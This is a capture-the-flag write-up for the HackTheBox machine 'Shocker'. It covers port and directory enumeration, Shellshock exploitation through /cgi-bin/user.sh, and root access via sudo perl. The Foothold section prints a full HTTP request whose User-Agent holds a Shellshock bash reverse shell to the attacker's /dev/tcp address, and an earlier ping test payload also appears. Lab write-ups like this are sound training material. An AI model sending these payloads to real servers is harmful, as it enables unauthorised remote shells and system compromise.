# Shocker- HackTheBox WriteUp

![info_card](/images/shocker/info_card)

## Enumeration & Information Gathering 
#### Scanning 

Nmap:
```
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
```

#### Service Enumeration 

Gobuster results:

```
/.hta (Status: 403) [Size: 290]
/.hta.txt (Status: 403) [Size: 294]
/.hta.html (Status: 403) [Size: 295]
/.hta.php (Status: 403) [Size: 294]
/.hta.asp (Status: 403) [Size: 294]
/.hta.aspx (Status: 403) [Size: 295]
/.hta.jsp (Status: 403) [Size: 294]
/.htpasswd (Status: 403) [Size: 295]
/.htpasswd.aspx (Status: 403) [Size: 300]
/.htpasswd.jsp (Status: 403) [Size: 299]
/.htpasswd.txt (Status: 403) [Size: 299]
/.htpasswd.html (Status: 403) [Size: 300]
/.htpasswd.php (Status: 403) [Size: 299]
/.htpasswd.asp (Status: 403) [Size: 299]
/.htaccess (Status: 403) [Size: 295]
/.htaccess.html (Status: 403) [Size: 300]
/.htaccess.php (Status: 403) [Size: 299]
/.htaccess.asp (Status: 403) [Size: 299]
/.htaccess.aspx (Status: 403) [Size: 300]
/.htaccess.jsp (Status: 403) [Size: 299]
/.htaccess.txt (Status: 403) [Size: 299]
/cgi-bin/ (Status: 403) [Size: 294]
/cgi-bin/.html (Status: 403) [Size: 299]
/index.html (Status: 200) [Size: 137]
/index.html (Status: 200) [Size: 137]
/server-status (Status: 403) [Size: 299]
```

We notice the /cgi-bin/ directory, if the system is old we could try shell shock. 

Navigating to the home page only shows a picture:

![home](/images/shocker/home/png)


We download the page with wget and check the date was last modified and see september 2014.

![wget_home](/images/shocker/wget_home/png)


Knowing Shell shock was around that period and with the existense of the cgi-bin folder, it's definetly worth trying 


After trying shell shock for a while, I realized I was trying to execute a script in the url http://10.0.10.56/cgi-bin/ 
This is most likely is only possible if a shell script is running. 

We fuzz the url while still researching ShellShcok and quickly find **user.sh**

Navigating to user.sh simply downloads the file, mhmm wierd, however, when open it displays **uptime** from the system

![uptime_browser](/images/shocker/uptime.png)

In burp:
![uptime_burp](/imanges/shocker/uptime_burp.png)

Shellshock Test:

Trying to ping our host while running tcpdump, we are successfull!

>User-Agent: () { :; }; /bin/ping 10.10.14.90

![ping_tdump](/images/shocker/ping_tdump.png)

## Exploitation 
#### Foothold 

![foothold](/images/shocker/foothold.png)

```
PAYLOAD
>GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.90/443 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

## Privilege Escalation 

We run sudo -l and see we can run /usr/bin/perl without a password. That's perfect for privesc.

So we can just execute /bin/bash with sudo and we are root

![root](/images/shocker/root.png) 

LateComerz


